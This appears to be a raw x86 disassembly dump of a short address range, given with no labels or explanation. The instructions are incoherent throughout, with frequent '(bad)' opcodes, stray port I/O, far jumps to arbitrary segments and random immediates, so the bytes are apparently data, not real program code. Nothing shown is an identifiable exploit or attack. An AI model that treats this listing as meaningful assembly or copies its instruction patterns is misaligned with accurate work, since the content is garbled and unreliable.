  41dac3:	sar    BYTE PTR [eax-0x5029ae60],0xbd
  41daca:	or     al,0xc2
  41dacc:	jne    0x41dafb
  41dace:	adc    edx,DWORD PTR [ebx+0x7c]
  41dad1:	call   0xe5d47df3
  41dad6:	bound  eax,QWORD PTR [edi]
  41dad8:	or     eax,0xb9a2cd80
  41dadd:	fild   WORD PTR [ecx]
  41dadf:	jmp    0x5898:0xe999bea3
  41dae6:	jecxz  0x41daa5
  41dae8:	adc    al,0x32
  41daea:	dec    ebx
  41daeb:	mov    DWORD PTR fs:[ebx],0x2100c003
  41daf2:	xchg   DWORD PTR [esi+esi*4+0x3d],eax
  41daf6:	cmp    DWORD PTR [ebp+0x16],ebx
  41daf9:	(bad)
  41dafc:	dec    edx
  41dafd:	cmp    BYTE PTR [ebx-0x20],bh
  41db00:	out    0x3c,eax
  41db02:	(bad)  
  41db03:	out    dx,al
  41db04:	and    DWORD PTR [ebp-0x7a],ebp
  41db07:	push   es
  41db08:	pushf  
  41db09:	fwait
  41db0a:	in     eax,0xe9
  41db0c:	sbb    al,BYTE PTR [edx-0x43]
  41db0f:	jns    0x41db7c
  41db11:	jl     0x41db46
  41db13:	inc    edx
  41db14:	iret   
  41db15:	or     al,0x32
  41db17:	icebp  
  41db18:	sub    DWORD PTR [edi-0x75940db3],esp
  41db1e:	mov    ah,0xef
  41db20:	mov    bl,0x5a
  41db22:	cmp    al,0xfe
  41db24:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41db26:	leave  
  41db27:	faddp  st(7),st
  41db29:	out    dx,al
  41db2a:	daa    
  41db2b:	push   ss
  41db2c:	xlat   BYTE PTR ds:[ebx]
  41db2d:	sub    al,0x68
  41db2f:	xchg   ecx,eax
  41db30:	test   eax,edi
  41db32:	fisubr WORD PTR [edx]
  41db34:	mov    al,ds:0x19c6b87d
  41db39:	pop    eax
  41db3a:	jno    0x41db3c
  41db3c:	test   BYTE PTR [eax],dl
  41db3e:	out    0x5c,eax
  41db40:	ror    DWORD PTR [eax-0x39],1
  41db43:	leave  
  41db44:	mov    esp,DWORD PTR [eax+0x47]
  41db47:	sbb    bl,BYTE PTR [bx+si]
  41db4a:	sar    BYTE PTR [eax+0x31],1
  41db4d:	clc    
  41db4e:	loop   0x41db58
  41db50:	or     edi,edx
  41db52:	and    edx,eax
  41db54:	fldenv [eax+0x4]
  41db57:	dec    eax
  41db58:	jmp    0x41db55
  41db5a:	jg     0x41db19
  41db5c:	loope  0x41dbb7
  41db5e:	pop    edx
  41db5f:	add    ah,cl
  41db61:	psadbw mm7,QWORD PTR [esi+ecx*8+0x763f50e1]
  41db69:	jp     0x41daef
  41db6b:	xchg   DWORD PTR [edx+ebx*4],ebp
  41db6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db6f:	stos   DWORD PTR es:[edi],eax
  41db70:	or     dh,BYTE PTR [ebx-0x53f8d8f2]
  41db76:	test   DWORD PTR [esp+eiz*2+0x9],0xb808f1e9
  41db7e:	cs mov ecx,0xd5e26490
  41db84:	mov    eax,ds:0xe351bcff
  41db89:	push   ebp
  41db8a:	dec    ebp
  41db8b:	and    DWORD PTR [ecx+0x37],0xffffffd2
  41db8f:	inc    ebx
  41db90:	and    ah,ah
  41db92:	popf   
  41db93:	dec    ecx
  41db94:	test   eax,0xd5293831
  41db99:	sbb    ebp,edi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	data16 sub bl,BYTE PTR gs:[esi]
  41dba0:	or     bh,BYTE PTR [edx+esi*8]
  41dba3:	pop    esi
  41dba4:	jle    0x41db6b
  41dba6:	arpl   WORD PTR [edi-0x5e10f1c4],ax
  41dbac:	pop    edi
  41dbad:	sub    eax,0x5369d781
  41dbb2:	pop    es
  41dbb3:	les    ebx,FWORD PTR [edx-0x60411aa6]
  41dbb9:	pushf  
  41dbba:	jo     0x41dc05
  41dbbc:	inc    eax
  41dbbd:	in     eax,dx
  41dbbe:	push   0xab16d036
  41dbc3:	jp     0x41db94
  41dbc5:	or     dl,BYTE PTR [ebx-0x22b6629c]
  41dbcb:	retf   
  41dbcc:	out    dx,eax
  41dbcd:	inc    eax
  41dbce:	mov    edx,0xa3c9d742
  41dbd3:	mov    esi,0x81d47ce8
  41dbd8:	and    BYTE PTR [eax+0x5dc836df],cl
  41dbde:	xchg   BYTE PTR [ebx-0x44],ch
  41dbe1:	lods   al,BYTE PTR ds:[esi]
  41dbe2:	scas   eax,DWORD PTR es:[edi]
  41dbe3:	div    BYTE PTR [esi+ebx*2]
  41dbe6:	outs   dx,BYTE PTR ds:[esi]
  41dbe7:	xchg   ebp,eax
  41dbe8:	loop   0x41dc34
  41dbea:	adc    eax,0xcb618f6d
  41dbef:	icebp  
  41dbf0:	push   ecx
  41dbf1:	neg    BYTE PTR [edi+0x39]
  41dbf4:	out    dx,eax
  41dbf5:	outs   dx,DWORD PTR ds:[esi]
  41dbf6:	call   0x4e52e9d1
  41dbfb:	dec    esp
  41dbfc:	jns    0x41dc6e
  41dbfe:	jb     0x41dbf2
  41dc00:	je     0x41dc26
  41dc02:	mul    DWORD PTR [ebx+0x77329c28]
  41dc08:	pop    ebp
  41dc09:	push   ecx
  41dc0a:	je     0x41dc04
  41dc0c:	(bad)  
  41dc0d:	push   cs
  41dc0e:	push   ds
  41dc0f:	sbb    al,0x54
  41dc11:	mov    eax,ds:0x52b9a54e
  41dc16:	popa   
  41dc17:	pop    edx
  41dc18:	xchg   edx,eax
  41dc19:	repz call 0x5a9d:0x42cdb183
  41dc21:	push   edi
  41dc22:	bound  eax,QWORD PTR [esi+0x2d2c5486]
  41dc28:	mov    al,0xa5
  41dc2a:	jecxz  0x41dbc5
  41dc2c:	outs   dx,BYTE PTR ds:[esi]
  41dc2d:	fwait
  41dc2e:	sbb    eax,DWORD PTR [ebx-0x505739ab]
  41dc34:	push   0xffffffe4
  41dc36:	nop
  41dc37:	es dec eax
  41dc39:	sti    
  41dc3a:	sub    DWORD PTR [ebx-0x74],ecx
  41dc3d:	add    ah,ch
  41dc3f:	add    al,0x5c
  41dc42:	or     ah,BYTE PTR [ebx]
  41dc44:	sbb    DWORD PTR [ebx+0xd247aee],ebx
  41dc4a:	and    esi,DWORD PTR [ebp+0xb2cdd31]
  41dc50:	jg     0x41dc67
  41dc52:	adc    ebp,DWORD PTR [eax-0x3b]
  41dc55:	cmp    al,0x5a
  41dc57:	add    ch,ah
  41dc59:	jns    0x41dc00
  41dc5b:	dec    ecx
  41dc5c:	add    BYTE PTR [ebx-0x58],dh
  41dc5f:	ret    
  41dc60:	cld    
  41dc61:	aam    0x54
  41dc63:	xchg   ebp,eax
  41dc64:	inc    eax
  41dc65:	in     eax,0x88
  41dc67:	mov    eax,ds:0x478e9914
  41dc6c:	pop    es
  41dc6d:	push   esp
  41dc6e:	(bad)  [edi]
  41dc70:	jmp    0xe99f:0xb84b5ec6
  41dc77:	or     edx,DWORD PTR [ebx-0x43]
  41dc7a:	cmp    BYTE PTR [eax],dl
  41dc7c:	out    0xa4,al
  41dc7e:	pop    esp
  41dc7f:	adc    BYTE PTR [edi+0x3f],0xa0
  41dc83:	jmp    0x8bfc6a98
  41dc88:	loop   0x41dcfb
  41dc8a:	hlt    
  41dc8b:	(bad)  
  41dc8c:	scas   eax,DWORD PTR es:[edi]
  41dc8d:	into   
  41dc8e:	push   0x16
  41dc90:	clc    
  41dc91:	imul   WORD PTR [edx+eax*4+0x3b90e16d]
  41dc99:	enter  0xf00f,0x52
  41dc9d:	popf   
  41dc9e:	out    0xe7,al
  41dca0:	jecxz  0x41dc95
  41dca2:	mov    bh,0x18
  41dca4:	mov    ebx,DWORD PTR [ebp+0x3e9d0947]
  41dcaa:	add    al,0xe6
  41dcac:	add    dh,BYTE PTR [esi-0x333665b6]
  41dcb2:	inc    ebp
  41dcb3:	enter  0xde04,0xde
  41dcb7:	mov    ch,0x9c
  41dcb9:	sbb    esp,DWORD PTR [eax-0x67]
  41dcbc:	sbb    eax,DWORD PTR [eax-0x16]
  41dcbf:	jnp    0x41dc56
  41dcc1:	shr    al,cl
  41dcc3:	xchg   ebx,eax
  41dcc4:	push   edx
  41dcc5:	pusha  
  41dcc6:	adc    eax,0xa5f68ddb
  41dccb:	jb     0x41dcc5
  41dccd:	cmp    dh,BYTE PTR [edi+0x1c]
  41dcd0:	je     0x41dd4a
  41dcd2:	push   0x67d55fd9
  41dcd7:	cmp    DWORD PTR [ebp+0x53],esi
  41dcda:	xchg   BYTE PTR [edx],bh
  41dcdc:	inc    edx
  41dcdd:	pop    eax
  41dcde:	mov    esp,ebx
  41dce0:	cli    
  41dce1:	js     0x41dc6b
  41dce3:	(bad)  
  41dce4:	pop    esp
  41dce5:	jbe    0x41dd46
  41dce7:	or     edi,DWORD PTR [edi-0x1ec992fe]
  41dced:	int    0xd7
  41dcef:	adc    ebp,DWORD PTR [ecx-0x71a786aa]
  41dcf5:	pusha  
  41dcf6:	jo     0x41dcc1
  41dcf8:	xchg   DWORD PTR [eax+edx*8-0x570c3e84],ebx
  41dcff:	xor    eax,0xe70332d6
  41dd04:	and    al,0xf3
  41dd06:	cmp    dh,BYTE PTR [ebx+0x236b681b]
  41dd0c:	out    dx,al
  41dd0d:	cli    
  41dd0e:	ret    0x5fa9
  41dd11:	scas   al,BYTE PTR es:[edi]
  41dd12:	dec    edx
  41dd13:	enter  0x86a8,0xca
  41dd17:	mov    edx,0x19679272
  41dd1c:	sbb    DWORD PTR [edx+0x12],esp
  41dd1f:	sub    al,0x41
  41dd21:	bound  eax,QWORD PTR [edi-0x39]
  41dd24:	xor    DWORD PTR [edx+0x14],ebp
  41dd27:	push   edi
  41dd28:	lahf   
  41dd29:	mov    ds:0xab16d851,al
  41dd2e:	lods   al,BYTE PTR ds:[esi]
  41dd2f:	div    BYTE PTR [edx-0xb]
  41dd32:	mov    edx,0x1e92b3ae
  41dd37:	jo     0x41dcdc
  41dd39:	push   edi
  41dd3a:	jp     0x41dd33
  41dd3c:	sbb    BYTE PTR [edi],bl
  41dd3e:	xchg   esi,eax
  41dd3f:	mov    DWORD PTR [esi-0x80],ecx
  41dd42:	icebp  
  41dd43:	lods   eax,DWORD PTR ds:[esi]
  41dd44:	pushf  
  41dd45:	or     al,0x6e
  41dd47:	xor    BYTE PTR [edi+0x20e2d859],ch
  41dd4d:	mov    esi,0x86f88905
  41dd52:	sub    DWORD PTR [edi-0x41823767],ecx
  41dd58:	test   DWORD PTR [ebx+0x1f392d12],esp
  41dd5e:	sahf   
  41dd5f:	cdq    
  41dd60:	xor    eax,0xadfe1e8c
  41dd65:	mov    eax,ds:0x6cb9980c
  41dd6a:	das    
  41dd6b:	xchg   ecx,eax
  41dd6c:	ficomp DWORD PTR [edi+0xc]
  41dd6f:	pop    ds
  41dd70:	push   cs
  41dd71:	aad    0x71
  41dd73:	cmp    ebx,DWORD PTR [eax-0x77]
  41dd76:	or     esp,eax
  41dd78:	scas   al,BYTE PTR es:[edi]
  41dd79:	pusha  
  41dd7a:	rep ins DWORD PTR es:[edi],dx
  41dd7c:	(bad)  
  41dd7d:	(bad)  [ecx+0x47c9b1a8]
  41dd83:	nop
  41dd84:	call   0x1a2a0642
  41dd89:	add    al,0xc4
  41dd8b:	ds or  eax,0xd69eed40
  41dd91:	mov    ebx,0x26ce8b75
  41dd96:	fst    QWORD PTR [ebp+0x10]
  41dd99:	fbld   TBYTE PTR [ebx]
  41dd9b:	daa    
  41dd9c:	icebp  
  41dd9d:	cmp    ah,dl
  41dd9f:	add    BYTE PTR [eax],cl
  41dda1:	and    DWORD PTR [edx-0x28],esp
  41dda4:	add    DWORD PTR [esi-0x22],esp
  41dda7:	je     0x41de22
  41dda9:	and    DWORD PTR [esi-0x47],esi
  41ddac:	stos   DWORD PTR es:[edi],eax
  41ddad:	push   edi
  41ddae:	fbld   TBYTE PTR [esi+eiz*4]
  41ddb1:	addr16 out dx,al
  41ddb3:	inc    edi
  41ddb4:	data16 fsubr DWORD PTR [edx+0x13]
  41ddb8:	and    DWORD PTR [edi],eax
  41ddba:	pop    ebx
  41ddbb:	push   es
  41ddbc:	in     al,0x89
  41ddbe:	sbb    cl,BYTE PTR [eax+edi*2]
  41ddc1:	dec    esi
  41ddc2:	mov    edx,0xa23590b5
  41ddc7:	mov    ss,ecx
  41ddc9:	out    0xd8,eax
  41ddcb:	mov    ah,0x89
  41ddce:	outs   dx,BYTE PTR ds:[esi]
  41ddcf:	cli    
  41ddd0:	out    0x9b,eax
  41ddd2:	lods   al,BYTE PTR ds:[esi]
  41ddd3:	adc    eax,0x2d5f5ab3
  41ddd8:	inc    esp
  41ddd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddda:	xchg   edx,eax
  41dddb:	cmp    DWORD PTR [eax-0x7d],esi
  41ddde:	sub    DWORD PTR [edi+0x2d989db4],ebx
  41dde4:	adc    DWORD PTR [ecx+ebp*8],ebx
  41dde7:	xchg   ecx,eax
  41dde8:	fisub  WORD PTR [eax+0x53]
  41ddeb:	lds    ecx,FWORD PTR [edi+eax*1-0x3662e7b3]
  41ddf2:	dec    ebp
  41ddf3:	mov    edx,0xc638066b
  41ddf8:	push   0x26b488a3
  41ddfd:	data16 jnp 0x41de59
  41de00:	jecxz  0x41de1d
  41de02:	sub    dh,al
  41de04:	or     esi,DWORD PTR [esi+0x25]
  41de07:	icebp  
  41de08:	jb     0x41de7c
  41de0a:	sub    al,BYTE PTR [edi-0x329baa4e]
  41de10:	mov    es,WORD PTR [ebx]
  41de12:	aam    0xf7
  41de14:	lahf   
  41de15:	xchg   edi,eax
  41de16:	loope  0x41de3f
  41de18:	inc    DWORD PTR [ebx-0x47b658c4]
  41de1e:	cmp    ebp,eax
  41de20:	(bad)  
  41de21:	and    eax,0x4fe3b495
  41de26:	test   al,0xbf
  41de28:	test   DWORD PTR [ebx-0x31226ae6],esi
  41de2e:	cmp    ah,dl
  41de30:	int3   
  41de31:	xchg   ebp,eax
  41de32:	pushf  
  41de33:	lods   eax,DWORD PTR ds:[esi]
  41de34:	push   ebx
  41de35:	je     0x41de99
  41de37:	and    BYTE PTR [esp+esi*2],bh
  41de3a:	jns    0x41de65
  41de3c:	inc    ecx
  41de3d:	and    BYTE PTR [ebx-0x5bc01a7b],al
  41de43:	(bad)  
  41de44:	jg     0x41deb7
  41de46:	in     al,0x9f
  41de48:	mov    esp,0x39f1ab1f
  41de4d:	sbb    BYTE PTR [edi],cl
  41de4f:	inc    ecx
  41de50:	add    eax,0x66c18813
  41de55:	inc    edi
  41de56:	in     al,dx
  41de57:	lods   eax,DWORD PTR ds:[esi]
  41de58:	rcr    BYTE PTR [esi-0x6c],cl
  41de5b:	int3   
  41de5c:	sbb    ebp,esp
  41de5e:	cmp    dh,dh
  41de60:	aas    
  41de61:	add    ebp,ebx
  41de63:	jnp    0x41de73
  41de65:	call   0x4fc52c3c
  41de6a:	and    BYTE PTR [ebx],ah
  41de6c:	mov    bl,BYTE PTR [eax+0x66f05f0b]
  41de72:	icebp  
  41de73:	cmc    
  41de74:	pop    ecx
  41de75:	inc    ebp
  41de76:	retf   0xb603
  41de79:	bound  edx,QWORD PTR [ecx+0x4a]
  41de7c:	lahf   
  41de7d:	inc    esi
  41de7e:	mov    ebp,ebx
  41de80:	inc    edi
  41de81:	mov    ecx,0xff9efd5c
  41de86:	jle    0x41de63
  41de88:	into   
  41de89:	and    BYTE PTR [ebp+0x47],cl
  41de8c:	or     esp,ecx
  41de8e:	into   
  41de8f:	shl    BYTE PTR [ebx],cl
  41de91:	mov    ecx,0x497041d7
  41de96:	stos   BYTE PTR es:[edi],al
  41de97:	dec    edx
  41de98:	dec    edi
  41de99:	mov    ss,ebp
  41de9b:	mov    esp,0xf88b7c1d
  41dea0:	imul   edi,DWORD PTR [eax-0x8d99468],0x78
  41dea7:	aad    0xb
  41dea9:	je     0x41debe
  41deab:	mov    ah,0x33
  41dead:	xchg   ecx,eax
  41deae:	sahf   
  41deaf:	test   ch,0x4d
  41deb2:	push   ecx
  41deb3:	jl     0x41df30
  41deb5:	xchg   ecx,eax
  41deb6:	or     BYTE PTR [edi],ah
  41deb8:	inc    edx
  41deb9:	xor    edx,DWORD PTR [edx-0x52]
  41debc:	xchg   ecx,eax
  41debd:	jmp    0x41de66
  41debf:	or     ah,BYTE PTR [edi]
  41dec1:	call   esp
  41dec3:	int    0x42
  41dec5:	mov    eax,ds:0x94b5d683
  41deca:	sbb    al,0xd4
  41decc:	js     0x41de5a
  41dece:	add    ebx,DWORD PTR [esp+ebp*4+0x4abd5851]
  41ded5:	xor    al,0xa7
  41ded7:	mov    bh,0xe1
  41ded9:	lods   al,BYTE PTR ds:[esi]
  41deda:	scas   al,BYTE PTR es:[edi]
  41dedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dedc:	ret    0x2bc2
  41dedf:	pop    esi
  41dee0:	cmp    al,0x89
  41dee2:	jmp    0x41df29
  41dee4:	sub    ch,dl
  41dee6:	or     al,BYTE PTR [esi-0x4703ba16]
  41deec:	pop    ebp
  41deed:	cs sub dh,dl
  41def0:	lods   al,BYTE PTR ds:[esi]
  41def1:	pop    ds
  41def2:	ror    DWORD PTR [ecx-0x4ebeb63a],cl
  41def8:	popf   
  41def9:	jne    0x41df43
  41defb:	adc    eax,edi
  41defd:	mov    dh,0x1f
  41deff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df00:	cmc    
  41df01:	inc    esi
  41df02:	adc    DWORD PTR [esi-0x7e],esp
  41df05:	test   DWORD PTR [ebp-0x59db0188],eax
  41df0b:	push   edi
  41df0c:	mov    eax,ds:0x672ca4c4
  41df11:	pop    ds
  41df12:	pusha  
  41df13:	nop
  41df14:	or     esp,ecx
  41df16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df17:	sbb    DWORD PTR [ebx+0xdaacc7d],esp
  41df1d:	jg     0x41df5f
  41df1f:	push   cs
  41df20:	das    
  41df21:	or     BYTE PTR [edi+0x4f63319e],bh
  41df27:	xchg   ebx,eax
  41df28:	adc    eax,DWORD PTR gs:[eax+0x3f]
  41df2c:	outs   dx,BYTE PTR ds:[esi]
  41df2d:	ficom  WORD PTR [ebp+edi*8+0x1ff05c81]
  41df34:	ror    DWORD PTR [eax+0x26],1
  41df37:	xor    ch,BYTE PTR [ebx]
  41df39:	je     0x41df7e
  41df3b:	pop    ecx
  41df3c:	cli    
  41df3d:	mov    ch,0xd9
  41df3f:	mov    esi,0xb2bab6b0
  41df44:	adc    al,ch
  41df46:	gs mov ch,0x3a
  41df49:	mov    eax,ds:0xa998c4b0
  41df4e:	inc    edx
  41df4f:	adc    BYTE PTR [edi+0x65],al
  41df52:	xor    esp,esp
  41df54:	jb     0x41df97
  41df56:	push   es
  41df57:	sbb    DWORD PTR [ebp+0x131a5ed5],0xffffffc7
  41df5e:	nop
  41df5f:	add    DWORD PTR [edx],0xffffff84
  41df62:	enter  0x3a38,0xb5
  41df66:	jmp    0x5b4966b8
  41df6b:	dec    edx
  41df6c:	(bad)  
  41df6e:	adc    al,0x40
  41df70:	jno    0x41df87
  41df72:	pop    ds
  41df73:	out    0xf2,al
  41df75:	(bad)  
  41df76:	lds    edi,FWORD PTR [ebx-0x2b]
  41df79:	cmp    eax,0xf8307e7a
  41df7e:	jecxz  0x41df43
  41df80:	push   ds
  41df81:	sahf   
  41df82:	dec    DWORD PTR [ebx-0x461a2695]
  41df88:	inc    edi
  41df89:	push   ebp
  41df8a:	and    al,0xb0
  41df8c:	out    0xe2,al
  41df8e:	sysenter 
  41df90:	in     eax,0x1d
  41df92:	pop    ecx
  41df93:	dec    esp
  41df94:	mov    ebp,0x49f77b30
  41df99:	fldcw  WORD PTR [ecx+0x7a]
  41df9c:	adc    BYTE PTR [ecx+eiz*2+0x26],cl
  41dfa0:	lahf   
  41dfa1:	push   ebp
  41dfa2:	cvtpi2ps xmm4,mm6
  41dfa5:	sbb    eax,DWORD PTR [ecx]
  41dfa7:	int3   
  41dfa8:	pusha  
  41dfa9:	pop    ecx
  41dfaa:	pop    edi
  41dfab:	in     al,0x29
  41dfad:	faddp  st(6),st
  41dfaf:	rcl    BYTE PTR [ecx],1
  41dfb1:	jnp    0x41df61
  41dfb3:	not    DWORD PTR [edi+0x337f15fe]
  41dfb9:	push   es
  41dfba:	fdiv   QWORD PTR gs:[eax]
  41dfbd:	cld    
  41dfbe:	inc    edx
  41dfbf:	xchg   DWORD PTR [eax-0x406d83c9],esi
  41dfc5:	cmp    al,0x3
  41dfc7:	sbb    esi,DWORD PTR [eax+edx*2]
  41dfca:	push   ebp
  41dfcb:	ins    BYTE PTR es:[edi],dx
  41dfcc:	xor    esp,DWORD PTR [eax]
  41dfce:	xlat   BYTE PTR ds:[ebx]
  41dfcf:	xchg   edi,eax
  41dfd0:	jne    0x41df8c
  41dfd2:	fist   DWORD PTR [edi+0x9d953a4]
  41dfd8:	jmp    0x41dff7
  41dfda:	ins    BYTE PTR es:[edi],dx
  41dfdb:	xor    bl,ah
  41dfdd:	cmp    ecx,DWORD PTR [ecx]
  41dfdf:	loop   0x41dfed
  41dfe1:	cmp    ebx,DWORD PTR [edi-0x366d228]
  41dfe7:	inc    esp
  41dfe8:	test   al,0xba
  41dfea:	icebp  
  41dfeb:	mov    cl,0xa1
  41dfed:	sub    esi,DWORD PTR [ecx-0x32]
  41dff0:	mov    esi,0xa4dceac0
  41dff5:	xor    BYTE PTR [eax-0x61a03192],bh
  41dffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dffc:	loopne 0x41dfa2
  41dffe:	pop    eax
  41dfff:	cmp    BYTE PTR [ebx+ebp*2],bl
  41e002:	xchg   DWORD PTR [esi-0x5],ecx
  41e005:	enter  0x79eb,0x75
  41e009:	(bad)  
  41e00a:	aam    0x5d
  41e00c:	push   ebx
  41e00d:	outs   dx,DWORD PTR ds:[esi]
  41e00e:	out    dx,eax
  41e00f:	cwde   
  41e010:	mov    DWORD PTR [ebx],ecx
  41e012:	stos   DWORD PTR es:[edi],eax
  41e013:	pop    es
  41e014:	mov    ebx,0xafb4b68b
  41e019:	into   
  41e01a:	push   0x62
  41e01c:	dec    ebp
  41e01d:	fld    DWORD PTR [ebp-0x3ccd873b]
  41e023:	inc    edx
  41e024:	sub    al,0xa2
  41e026:	ja     0x41e03f
  41e028:	aam    0xd9
  41e02a:	(bad)  [edx]
  41e02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e02d:	icebp  
  41e02e:	jne    0x41dfb1
  41e030:	mov    eax,ebp
  41e032:	ds retf 
  41e034:	sub    edi,DWORD PTR [eax+eax*8]
  41e037:	dec    esi
  41e038:	andnps xmm6,XMMWORD PTR [ebx-0x22c2bafc]
  41e03f:	ret    
  41e040:	cmp    ah,BYTE PTR [esi*4-0x7ada1f72]
  41e047:	add    DWORD PTR [esi-0x2255a0ff],0x3dcdb582
  41e051:	or     BYTE PTR [edx],0xc4
  41e054:	mov    BYTE PTR [ecx],bl
  41e056:	outs   dx,BYTE PTR ds:[esi]
  41e057:	lea    ecx,[ebx+0x6d]
  41e05a:	test   DWORD PTR [ebx+0x3e],0x7a10eec7
  41e061:	mov    esi,0xe87b70f1
  41e066:	retf   0xfe62
  41e069:	sbb    cl,BYTE PTR [ebp+0x540eba1f]
  41e06f:	dec    ebp
  41e070:	cmp    DWORD PTR [edx],esi
  41e072:	js     0x41dffe
  41e074:	jg     0x41e0aa
  41e076:	mov    esi,DWORD PTR [ecx+0x2a85c3c7]
  41e07c:	xchg   ecx,eax
  41e07d:	pusha  
  41e07e:	outs   dx,BYTE PTR ds:[esi]
  41e07f:	test   DWORD PTR [edi-0x6f375c39],ecx
  41e085:	push   edx
  41e086:	push   eax
  41e087:	add    DWORD PTR [esi+0x8c5356],ecx
  41e08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e08e:	mov    eax,0x9e4fb0d3
  41e093:	mov    bl,0x88
  41e095:	data16 hlt 
  41e097:	cmp    BYTE PTR [ecx],bh
  41e099:	push   ds
  41e09a:	ret    
  41e09b:	inc    eax
  41e09c:	jmp    0x829cc1a4
  41e0a1:	jmp    0xa27427de
  41e0a6:	and    BYTE PTR [edx+0x565540c9],ah
  41e0ac:	xor    al,0x6b
  41e0ae:	cli    
  41e0af:	(bad)  
  41e0b0:	cmc    
  41e0b1:	fsub   DWORD PTR ds:0x94694f91
  41e0b7:	or     al,0x49
  41e0b9:	in     eax,0x3b
  41e0bb:	sbb    eax,esp
  41e0bd:	sub    eax,DWORD PTR [edi+0x23]
  41e0c0:	fld    st(1)
  41e0c2:	shl    DWORD PTR [edi+0x54b356a1],1
  41e0c8:	sbb    BYTE PTR [esi+ecx*4+0x49],cl
  41e0cc:	mov    BYTE PTR [ebx+0x7f],al
  41e0cf:	clc    
  41e0d0:	aaa    
  41e0d1:	jnp    0x41e06a
  41e0d3:	inc    eax
  41e0d4:	fimul  DWORD PTR [ebp+0x3d1c6f11]
  41e0da:	out    0xe0,eax
  41e0dc:	jp     0x41e07a
  41e0de:	loope  0x41e074
  41e0e0:	lods   eax,DWORD PTR ds:[esi]
  41e0e1:	sub    esi,edx
  41e0e3:	sbb    al,BYTE PTR [edi-0x7b]
  41e0e6:	mov    ecx,0x3701191d
  41e0eb:	pop    ebx
  41e0ec:	and    bl,cl
  41e0ee:	add    esp,ebp
  41e0f0:	cmp    DWORD PTR [ecx],ecx
  41e0f2:	pop    ss
  41e0f3:	out    dx,eax
  41e0f4:	les    esi,FWORD PTR [ecx]
  41e0f6:	jo     0x41e13c
  41e0f8:	les    esp,FWORD PTR [ebp-0x5b]
  41e0fb:	xor    esp,DWORD PTR [edi-0x5e]
  41e0fe:	mov    ebx,0xb415b506
  41e103:	xchg   ebp,eax
  41e104:	xchg   edi,eax
  41e105:	jmp    0x41e120
  41e107:	fwait
  41e108:	call   0x1b4b:0xaf5ef5fc
  41e10f:	cdq    
  41e110:	icebp  
  41e111:	sti    
  41e112:	jbe    0x41e094
  41e114:	loope  0x41e0fc
  41e116:	push   edi
  41e117:	cmc    
  41e118:	test   DWORD PTR [edx+0x69],esi
  41e11b:	xchg   ecx,eax
  41e11c:	(bad)
  41e11f:	lock mov esi,0x45beb83b
  41e125:	push   ebp
  41e126:	loope  0x41e0af
  41e128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e129:	call   0xe71:0x36300368
  41e130:	sbb    BYTE PTR [ebx],cl
  41e132:	pop    ebx
  41e133:	loop   0x41e143
  41e135:	xor    eax,0x2cf989e9
  41e13a:	mov    ds:0xf0026e23,al
  41e13f:	ficom  WORD PTR [ecx+eax*4-0x41]
  41e143:	push   ebp
  41e144:	fcom   QWORD PTR [esi-0x143e1d2f]
  41e14a:	inc    edx
  41e14b:	inc    eax
  41e14c:	inc    esp
  41e14d:	mov    DWORD PTR [esp+ecx*2],ebx
  41e150:	adc    DWORD PTR [ecx-0x39],ecx
  41e153:	je     0x41e17c
  41e155:	out    dx,al
  41e156:	pop    ecx
  41e157:	clc    
  41e158:	push   eax
  41e159:	inc    ebx
  41e15a:	shl    BYTE PTR [esp+edi*4],cl
  41e15d:	les    esi,FWORD PTR [ecx-0x70]
  41e160:	rol    DWORD PTR [ebx],1
  41e162:	cmp    dl,BYTE PTR [esi+edi*8-0x4f505230]
  41e169:	sub    DWORD PTR [esi-0xa],esp
  41e16c:	cs stos DWORD PTR es:[edi],eax
  41e16e:	adc    ah,dh
  41e170:	fld    QWORD PTR [ecx+ebx*2+0x72]
  41e174:	(bad)  
  41e175:	push   DWORD PTR [edi]
  41e177:	dec    ebx
  41e178:	(bad)  [edi+0x4e04ba7f]
  41e17e:	or     al,0x7f
  41e180:	repnz mov ah,0xa5
  41e183:	scas   eax,DWORD PTR es:[edi]
  41e184:	jge    0x41e1ef
  41e186:	jnp    0x41e16e
  41e188:	cmp    edi,DWORD PTR [ebp+0x76]
  41e18b:	inc    esp
  41e18c:	das    
  41e18d:	mov    ch,0xbd
  41e18f:	cdq    
  41e190:	mov    cl,0x70
  41e192:	lahf   
  41e193:	sub    eax,0xbc77bdaf
  41e198:	lea    edx,[edx]
  41e19a:	loope  0x41e1b7
  41e19c:	aam    0xb9
  41e19e:	cli    
  41e19f:	inc    esp
  41e1a0:	mov    ds:0xf8be161c,al
  41e1a5:	nop
  41e1a6:	(bad)  
  41e1a7:	test   eax,0xf58c6d68
  41e1ac:	jbe    0x41e21b
  41e1ae:	cmc    
  41e1af:	fimul  DWORD PTR [eax]
  41e1b1:	lahf   
  41e1b2:	push   ebp
  41e1b3:	jmp    0x5cf6c215
  41e1b8:	mov    ds:0x2d8dacd,ax
  41e1be:	inc    esi
  41e1bf:	xor    BYTE PTR [ebp-0x60],dl
  41e1c2:	rcl    BYTE PTR [ebx-0x108eefac],0xe1
  41e1c9:	ss sti 
  41e1cb:	push   ss
  41e1cc:	in     eax,dx
  41e1cd:	xor    edx,eax
  41e1cf:	push   edx
  41e1d0:	push   ebp
  41e1d1:	push   ebp
  41e1d2:	mov    dh,0x6c
  41e1d4:	loop   0x41e1f1
  41e1d6:	arpl   WORD PTR [edi+0x6c023708],ax
  41e1dc:	cmp    edi,DWORD PTR [ebx-0x54]
  41e1df:	cmc    
  41e1e0:	pop    edx
  41e1e1:	mov    ebp,DWORD PTR [edx]
  41e1e3:	fld    st(5)
  41e1e5:	adc    eax,0x5fadbae9
  41e1ea:	xor    eax,DWORD PTR ds:[bp+di]
  41e1ee:	inc    ebx
  41e1ef:	(bad)
  41e1f2:	dec    ebx
  41e1f3:	pop    edi
  41e1f4:	push   cs
  41e1f5:	cdq    
  41e1f6:	test   al,0x68
